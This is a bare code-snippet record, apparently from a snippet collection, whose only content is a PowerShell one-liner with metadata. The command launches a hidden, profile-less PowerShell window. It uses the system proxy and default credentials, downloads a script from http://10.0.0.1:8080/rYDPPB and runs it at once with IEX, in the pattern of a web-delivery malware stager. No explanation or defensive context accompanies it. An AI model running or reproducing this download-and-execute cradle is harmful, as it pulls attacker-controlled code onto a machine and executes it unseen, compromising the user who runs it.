---
id: ff9b1bd7-dca1-4e80-879e-7362722a4cab
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:21.342189+00:00'
updated_at: '2023-04-10T20:25:00.365273+00:00'
---

# Code Snippet ff9b1bd7

**Language**: Powershell

```powershell
powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
```
